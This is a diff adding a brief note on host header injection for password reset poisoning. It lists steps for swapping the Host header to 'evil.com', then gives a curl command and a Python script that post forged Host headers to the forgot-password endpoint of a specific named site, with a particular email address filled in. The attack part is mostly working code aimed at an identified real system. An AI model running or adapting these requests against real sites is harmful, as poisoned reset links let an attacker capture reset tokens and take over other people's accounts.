@@ -1,0 +1,48 @@
+Host Header Injection: Password reset poisoning
+-----------------------------------------------
+Steps:
+------
+1. Find password reset page
+2. If page will accept the username or email to send the password reset link like:
+
+htpps://target.com/password_reset?code=xxxxxxxxx
+
+-> First check for host header injection by changing "Host:" to "evil.com"
+-> If they have the host header injection then they will send you a password reset link with injection URL like:
+
+https://evil.com/password_reset?code=xxxxxxxxx
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# cat lol.txt
+txtemail=sourabhsutar379%40gmail.com
+
+
+# curl -ks "https://canteen.pune.cdac.in/forgot_pass" -H "Host: evil.com" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0" -X POST -d@lol.txt
+
+
+
+
+
+
+#!/usr/bin/python3
+import requests
+
+url='https://canteen.pune.cdac.in/forgot_pass'
+head = {"Host":"py.com", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"}
+email = {"txtemail":"sourabhsutar379%40gmail.com"}
+data = requests.post(url, headers=head, params=email)
+print(data.status_code)
+
+
